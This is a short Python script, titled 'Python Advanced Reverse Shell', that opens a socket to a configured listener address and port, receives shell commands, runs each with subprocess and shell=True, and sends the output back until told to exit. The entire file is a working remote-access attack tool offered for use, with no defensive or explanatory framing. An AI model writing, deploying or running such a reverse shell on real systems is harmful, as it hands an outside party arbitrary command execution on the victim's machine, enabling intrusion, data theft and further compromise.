#!/usr/bin/env python
# Python Advanced Reverse Shell
# Configure LHOST and LPORT before use

import socket
import subprocess
import os

LHOST = '192.168.1.100'
LPORT = 4455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))

while True:
    command = s.recv(1024)
    if not command:
        break

    if command.strip() == 'exit':
        break

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = output.stdout.read() + output.stderr.read()
    s.send(result)

s.close()
